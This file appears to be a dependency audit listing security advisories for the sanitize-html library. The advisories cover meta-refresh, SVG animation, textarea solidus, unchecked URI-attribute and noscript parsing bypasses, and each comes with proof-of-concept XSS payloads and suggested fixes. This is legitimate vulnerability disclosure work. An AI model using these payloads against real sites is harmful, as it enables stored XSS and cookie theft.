@@ -1,0 +1,367 @@
+===== GHSA-cv27-6wvh-8x7j | moderate | cvss 5.4 CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N | CVE-2026-113661
+TITLE: ApostropheCMS: Incomplete CVE-2026-53606: `meta http-equiv=refresh` `content` still ships `javascript:` / `data:` URLs
+RANGES: <2.18.0 (installed 2.10.0)
+PATCHED: >=2.18.0
+
+### Summary
+
+CVE-2026-53606 expanded `allowedSchemesAppliedToAttributes` so named URL attributes (`action`, `formaction`, `data`, `poster`, `background`, later `ping`, `xlink:href`, …) go through `naughtyHref()`. A **URL nested inside `meta` `content`** (`http-equiv=refresh`) is not an attribute name on that list, so the embedded destination is never scheme-checked.
+
+Default `allowedTags` still omit `meta`. Same non-default integrator config as 53606: allow `meta` plus `http-equiv` / `content`.
+
+On **2.17.7**:
+
+```text
+sanitizeHtml(
+  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+  { allowedTags: ['meta'], allowedAttributes: { meta: ['http-equiv', 'content'] } }
+)
+// => <meta http-equiv="refresh" content="0;url=javascript:alert(1)" />
+```
+
+`data:text/html,…` and arbitrary `https:` destinations also survive. `formaction="javascript:…"` (53606) is stripped.
+
+Please **Request CVE**. Credit: Finder + Reporter (`adrbogacz`).
+
+### Details
+
+`naughtyHref()` only runs when the attribute name is in `allowedSchemesAppliedToAttributes` (`index.js` ~385). Refresh URLs live in a `content` value of the form `0;url=…`, so the gate never fires. Adding `content` to that list wholesale would break ordinary meta `content` (description, viewport).
+
+**Fix:** when `http-equiv` is `refresh` (case-insensitive), parse the `; url=` destination and run `naughtyHref('meta', url)`. Drop `content` (or the tag) if the URL is rejected. Leave other `meta` `content` values alone.
+
+### PoC
+
+Local `sanitize-html@2.17.7`. Output inspection only:
+
+```text
+node -e '
+const sanitize = require("sanitize-html");
+const opts = { allowedTags: ["meta"], allowedAttributes: { meta: ["http-equiv", "content"] } };
+for (const html of [
+  "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+  "<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,aaa\">",
+  "<form><button formaction=\"javascript:alert(1)\">x</button></form>",
+]) {
+  console.log(html, "=>", sanitize(html, html.includes("meta") ? opts : { allowedTags: ["form","button"], allowedAttributes: { button: ["formaction"] } }));
+}
+'
+```
+
+Expected: refresh `javascript:` / `data:` remain; 53606 `formaction` is removed. Do not attach a browser hang or stored-XSS page.
+
+### Impact
+
+An integrator who allowed `meta` + `content` expecting `allowedSchemes` to apply (the 53606 configuration pattern) still emits a refresh to `javascript:`, `data:`, or an attacker `https:` URL. Stored XSS / open redirect for viewers of that HTML. Default config is not affected.
+
+===== GHSA-g8qq-57p8-ggw5 | moderate | cvss 5.4 CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N | CVE-2026-84371
+TITLE: ApostropheCMS: Stored XSS via SVG SMIL URI-list scheme-policy bypass
+RANGES: >=1.9.0 <=2.17.6 (installed 2.10.0)
+PATCHED: >=2.17.7
+
+### Summary
+When SVG animation is allowed, `attributeName="href"` makes `values` a list of URL destinations. `sanitize-html` accepts a list that starts with a safe fragment even when `values` is explicitly scheme-checked, allowing a later `javascript:` destination to execute when the sanitized link is activated.
+
+### Details
+`index.js:371-383` validates each attribute as one flat URL. It does not recognize that `attributeName="href"` gives the sibling `values` attribute SMIL URI-list semantics. For `values="#safe;javascript:..."`, the leading fragment passes the flat check and the complete list is retained.
+
+### PoC
+This was reproduced with `sanitize-html@2.17.6` and Chromium 150.0.7871.124. The configuration adds SVG animation to the defaults and applies the existing scheme policy to `values`; it does not allow `javascript:`. Save this as `poc.js`:
+
+```js
+const sanitize = require('sanitize-html');
+
+const input = `<svg><a><animate attributeName="href" values="#safe;javascript:alert('XSS')" dur=".01s" fill="freeze"></animate><text y="30">Click me</text></a></svg>`;
+const output = sanitize(input, {
+  allowedTags: sanitize.defaults.allowedTags.concat(['svg', 'animate', 'text']),
+  allowedAttributes: {
+    ...sanitize.defaults.allowedAttributes,
+    animate: ['attributename', 'values', 'dur', 'fill'],
+    text: ['y']
+  },
+  allowedSchemesAppliedToAttributes:
+    sanitize.defaults.allowedSchemesAppliedToAttributes.concat(['values'])
+});
+console.log(output);
+```
+
+Install and run it, then open `poc.html` and click `Click me`:
+
+```sh
+npm install sanitize-html@2.17.6
+node poc.js > poc.html
+```
+
+The output retains the `javascript:` entry, and clicking the sanitized SVG displays `XSS`. With `input` changed to `<a href="javascript:alert(1)">control</a>`, the same configuration removes `href`.
+
+### Impact
+In an application that accepts attacker-authored SVG animation, the attacker can store this payload without scripts or event handlers. A victim who activates the sanitized link executes JavaScript in the application's origin despite the configured scheme policy.
+
+### Suggested fix
+Reject `attributeName` values selecting `href` or `xlink:href` on SVG `animate` and `set`, while retaining safe targets such as `fill`. Add `values`, `from`, and `to` regression cases.
+
+===== GHSA-jxwj-j7wr-gfrw | moderate | cvss 6.1 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | CVE-2026-63670
+TITLE: ApostropheCMS: Mutation-XSS / allowedTags bypass via literal `</textarea/>` solidus close
+RANGES: <=2.17.5 (installed 2.10.0)
+PATCHED: >=2.17.6
+
+### Summary
+A mutation-XSS / allowedTags bypass: when `textarea` (or `xmp`) is included in `allowedTags`, an input containing a literal `</textarea/>` (a solidus right after the RCDATA end-tag name) lets non-allowed markup such as `<img src=x onerror=…>` pass through `sanitizeHtml()` **live and unescaped**, even though `img`/`onerror` are not in the allowlist. A spec-compliant browser executes the surviving handler — XSS. This is a literal-solidus variant that bypasses the two most recent fixes in this code area (CVE-2026-40186, CVE-2026-44990), both already applied in 2.17.5. The default configuration is not affected.
+
+### Details
+`sanitize-html` emits the text content of HTML raw-text elements (`textarea`, `xmp`) without escaping. Two things combine:
+- **Parser differential:** on input, htmlparser2 does NOT recognize `</textarea/>` (solidus after the RCDATA
+  end-tag name) as a close tag; it emits `</textarea/><img …>` as a single raw-text node.
+- **Unescaped passthrough:** the `ontext` handler (`index.js` ~575-583) appends `textarea`/`xmp` content with
+`result += text` (no `escapeHtml`), assuming it is "already properly encoded" — true for entity-decoded
+  content (what CVE-2026-40186 fixed) but false for this mis-tokenized literal close tag.
+A spec browser treats `</textarea/>` as a valid `textarea` close, so the following `<img onerror>` is parsed as a live element. The recent fixes addressed entity-encoding (CVE-2026-40186) and the `xmp` default (CVE-2026-44990); neither covers the literal-solidus mis-tokenization, so the raw passthrough still leaks.
+
+### PoC
+```js
+// npm i sanitize-html@2.17.5 parse5 && node poc.js
+const sanitizeHtml = require('sanitize-html');
+const input = '<textarea></textarea/><img src=x onerror="alert(document.domain)">';
+const opts  = { allowedTags: sanitizeHtml.defaults.allowedTags.concat(['textarea']) };  // img NOT allowed
+console.log(sanitizeHtml(input, opts));
+// => <textarea></textarea/><img src=x onerror="alert(document.domain)"></textarea>
+//    the <img onerror> survives live and unescaped
+
+console.log(sanitizeHtml(input));   // default config (no textarea allowed) => ""  (safe)
+```
+Re-parsing the sanitized OUTPUT with **parse5** (the WHATWG HTML parser browsers/jsdom use) yields a **live
+`<img src=x onerror=alert(document.domain)>`** at `body` level (it escaped the textarea RCDATA, not inert text) → the `onerror` fires in a browser. Confirmed on 2.17.5 (Node v24). A canonical `poc.js` is attached.
+<img width="650" height="118" alt="image" src="https://github.com/user-attachments/assets/d63bb5b7-ba3e-4b0e-a821-86a453ea0352" />
+
+### Impact
+Cross-site scripting (CWE-79). Requires `textarea` (or `xmp`) in `allowedTags` — a benign-looking, common addition in form builders, CMS, and rich-text editors. Adding a harmless tag that then enables XSS via *non-allowed* `img`/`onerror` breaks the sanitizer's core contract; the maintainers have fixed this class before (e.g. GHSA-9mrh). An attacker who can submit content rendered through such a configuration achieves stored/reflected XSS (cookie theft, session hijack). Severity Medium (default config is safe; user interaction to view the page). **Suggested fix:** route `textarea`/`xmp` content through `escapeHtml` instead of the raw passthrough, and/or fix the htmlparser2 `</tag/>` RCDATA end-tag tokenization to match the WHATWG spec.
+
+===== GHSA-rm97-x556-q36h | moderate | cvss 5.3 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | CVE-2024-21501
+TITLE: sanitize-html Information Exposure vulnerability
+RANGES: <2.12.1 (installed 2.10.0)
+PATCHED: >=2.12.1
+
+Versions of the package sanitize-html before 2.12.1 are vulnerable to Information Exposure when used on the backend and with the style attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server.
+
+===== GHSA-vccv-cmxp-4j9h | moderate | cvss 5.4 CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N | CVE-2026-53606
+TITLE: sanitize-html has incomplete URI scheme validation in that allows javascript: URIs through action, formaction, data, poster, and background attributes
+RANGES: >=1.18.0 <=2.17.4 (installed 2.10.0)
+PATCHED: >=2.17.5
+
+## Summary
+
+sanitize-html uses `allowedSchemesAppliedToAttributes` (default: `['href', 'src', 'cite']`) to gate the `naughtyHref()` function that blocks dangerous URI schemes like `javascript:` and `vbscript:`. The HTML specification defines 10+ attributes that accept URIs (`action`, `formaction`, `data`, `poster`, `background`, `ping`, `xlink:href`, `dynsrc`, `lowsrc`), but none of these are included in the default gate list. When a developer allows any of these attributes in their configuration, `javascript:` URIs pass through completely unmodified, enabling XSS.
+
+The library has zero awareness of these URI-bearing attributes — none appear anywhere in the 854-line source file (verified by grep). No warning mechanism exists, and the README provides no security guidance about expanding `allowedSchemesAppliedToAttributes` when allowing form or media attributes.
+
+## Severity
+
+Exploitation requires non-default configuration: the developer must explicitly allow a non-default tag (e.g., `form`) AND a non-default attribute (e.g., `action`). Default configuration is NOT vulnerable. However, this is a common configuration pattern for CMS platforms, form builders, and rich content editors.
+
+## Affected Versions
+
+All versions of sanitize-html from v1.18.0 (which introduced `allowedSchemesAppliedToAttributes`) through at least v2.17.2. The default list has been `['href', 'src', 'cite']` since introduction and has never been expanded.
+
+## Root Cause
+
+**File**: `index.js:329` (sanitize-html 2.10.0, confirmed same in 2.17.x)
+
+```javascript
+// Line 329 — The gate that controls scheme validation
+if (options.allowedSchemesAppliedToAttributes.indexOf(a) >= 0) {
+    if (naughtyHref(name, value)) {
+        delete frame.attribs[a];
+        return;
+    }
+}
+```
+
+**Default list at line 829**:
+```javascript
+allowedSchemesAppliedToAttributes: ['href', 'src', 'cite'],
+```
+
+The `naughtyHref()` function (lines 627-667) correctly blocks `javascript:`, `vbscript:`, and other dangerous schemes. However, it has exactly 2 call sites in the entire codebase (lines 330 and 395), both inside the `indexOf` gate. There is no ungated path.
+
+When attribute name is `action`, `formaction`, `data`, `poster`, `background`, etc.:
+- `indexOf('action')` returns `-1`
+- The `if` block is skipped entirely
+- `naughtyHref()` is never called
+- `javascript:alert(1)` passes through unmodified
+
+The `escapeHtml()` function at line 464 provides no defense — it only encodes `& < > "` characters, which are not present in `javascript:alert(1)`.
+
+**Data Flow**:
+```
+Attacker input: <form action="javascript:alert(document.cookie)">
+1. htmlparser2 parses → tag='form', attribs={action:'javascript:alert(document.cookie)'}
+2. index.js:298 → allowedAttributes check: 'action' in developer config → PASS
+3. index.js:329 → ['href','src','cite'].indexOf('action') → -1 → SKIP naughtyHref()
+4. index.js:464 → escapeHtml('javascript:alert(document.cookie)') → unchanged
+5. OUTPUT: <form action="javascript:alert(document.cookie)">
+```
+
+## Steps to Reproduce
+
+```javascript
+const sanitize = require('sanitize-html');
+
+// ===== VECTOR 1: form action (100% reliable, all modern browsers) =====
+const v1 = sanitize(
+    '<form action="javascript:alert(document.cookie)"><button>Submit</button></form>',
+    {
+        allowedTags: ['form', 'button'],
+        allowedAttributes: { form: ['action'] }
+    }
+);
+console.log('V1 (action):', v1);
+// OUTPUT: <form action="javascript:alert(document.cookie)"><button>Submit</button></form>
+// XSS triggers when user submits the form
+
+// ===== VECTOR 2: button formaction (100% reliable) =====
+const v2 = sanitize(
+    '<button formaction="javascript:alert(1)">Click</button>',
+    {
+        allowedTags: ['button'],
+        allowedAttributes: { button: ['formaction'] }
+    }
+);
+console.log('V2 (formaction):', v2);
+// OUTPUT: <button formaction="javascript:alert(1)">Click</button>
+
+// ===== VECTOR 3: object data =====
+const v3 = sanitize(
+    '<object data="javascript:alert(1)"></object>',
+    {
+        allowedTags: ['object'],
+        allowedAttributes: { object: ['data'] }
+    }
+);
+console.log('V3 (data):', v3);
+// OUTPUT: <object data="javascript:alert(1)"></object>
+
+// ===== CONTROL: href IS scheme-checked (expected behavior) =====
+const ctrl = sanitize(
+    '<a href="javascript:alert(1)">click</a>',
+    {
+        allowedTags: ['a'],
+        allowedAttributes: { a: ['href'] }
+    }
+);
+console.log('Control (href):', ctrl);
+// OUTPUT: <a>click</a>   ← href correctly stripped by naughtyHref()
+```
+
+**Observed behavior**: `javascript:` preserved on `action`/`formaction`/`data` but correctly stripped on `href`.
+
+**Expected behavior**: `javascript:` should be stripped on ALL URI-bearing attributes, or at minimum, the library should warn developers when they allow URI-bearing attributes not covered by scheme validation.
+
+## Impact
+
+An attacker can achieve XSS in applications that use sanitize-html with non-default configurations allowing URI-bearing attributes:
+
+- `<form action="javascript:...">` — XSS on form submission (all modern browsers)
+- `<button formaction="javascript:...">` — per-button XSS override (all modern browsers)
+- `<object data="javascript:...">` — object load XSS (Chrome, Firefox)
+- `<video poster="javascript:...">` — limited browser support but spec-valid
+
+**Common vulnerable configurations**:
+- CMS platforms allowing form elements for user-generated content
+- Form builder applications
+- Rich text editors with extended tag allowlists
+- Email template editors allowing media/embed tags
+
+**Mitigating factors**:
+- Default configuration is NOT vulnerable
+- Requires double opt-in: non-default tag + non-default attribute
+- CSP `form-action` directive mitigates form-based vectors
+- Developers CAN manually add attributes to `allowedSchemesAppliedToAttributes`
+
+## Remediation
+
+**Option 1 (Recommended)**: Expand the default `allowedSchemesAppliedToAttributes` list:
+
+```javascript
+// index.js line 829, change from:
+allowedSchemesAppliedToAttributes: ['href', 'src', 'cite'],
+
+// to:
+allowedSchemesAppliedToAttributes: [
+    'href', 'src', 'cite', 'action', 'formaction',
+    'data', 'poster', 'background', 'ping',
+    'xlink:href', 'dynsrc', 'lowsrc'
+],
+```
+
+**Option 2**: Apply `naughtyHref()` to ALL attributes by default (invert the gate logic).
+
+**Option 3**: Add a runtime warning when developers allow URI-bearing attributes not in `allowedSchemesAppliedToAttributes` (analogous to `vulnerableTags` warning for `script`/`style` at lines 124-129).
+
+## Reporter
+
+Kevin Lee (Changseon Lee)
+OPCIA Corp. / PeanutAI Inc.
+Seoul, South Korea
+GitHub: crattack
+
+===== GHSA-x3q4-9hxx-gx8m | moderate | cvss 0  | CVE-2026-113654
+TITLE: ApostropheCMS sanitize-html: nonTextTags discard region ends early on an implied close, letting <noscript> content render
+RANGES: <2.18.0 (installed 2.10.0)
+PATCHED: >=2.18.0
+
+## Summary
+
+`sanitize-html` discards the *content* of every element in `nonTextTags`. It delimits that region
+using htmlparser2's close events, and ignores the `isImplied` flag htmlparser2 passes it. Closing a
+still-open **ancestor** from inside a `<noscript>` makes htmlparser2 unwind its stack past the
+`noscript`; the synthetic implied close it emits on the way ends the discard region early, and
+everything after it is treated as ordinary body content.
+
+A browser with scripting enabled parses `<noscript>` content as **raw text**, so the same markup
+renders as inert text there. The sanitizer therefore emits elements the page itself would not have.
+
+## Reproduction
+
+```js
+const sanitizeHtml = require("sanitize-html");
+
+sanitizeHtml('<div><noscript></div><img src="http://evil.test/t.gif"></noscript>', {
+  allowedTags: ["div", "img"],
+  allowedAttributes: { img: ["src"] },
+  nonTextTags: ["script", "style", "textarea", "option", "noscript"],
+});
+// => '<div></div><img src="http://evil.test/t.gif" />'
+```
+
+Chrome, given the same input, renders **no** `<img>` — the whole payload is raw text inside the
+unclosed `<noscript>`. Verified with Playwright, `srcdoc` into an iframe so the scripting flag is on.
+
+A `<![CDATA[` variant hides the opening tag from the parser entirely and has the same effect:
+
+```
+<p>Hi</p><![CDATA[ x > <noscript>]]><a href="…">Reset your password</a><img src="…beacon.gif"></noscript>
+```
+
+htmlparser2 runs a CDATA token to `]]>`; Chrome ends a bogus comment at the first `>`, so the
+`<noscript>` after it is real to the browser and invisible to the parser.
+
+## Where the behaviour is
+
+`index.js`:
+
+- `:154` — `nonTextTagsArray` (the default list, `['script','style','textarea','option','xmp']`).
+- `:638` — `onclosetag: function (name, isImplied)` — receives the flag.
+- `:644` — `skipTextDepth--` — decrements without consulting `isImplied`.
+
+## Suggested fix
+
+Do not end a discard region on an implied close. htmlparser2 already distinguishes them; the flag
+is passed and discarded. Something close to:
+
+```js
+onclosetag: function (name, isImplied) {
+  if (skipText) {
+    if (isImplied) return;   // an implied close must not end the region
+    skipTextDepth--;
+    …
+```
+
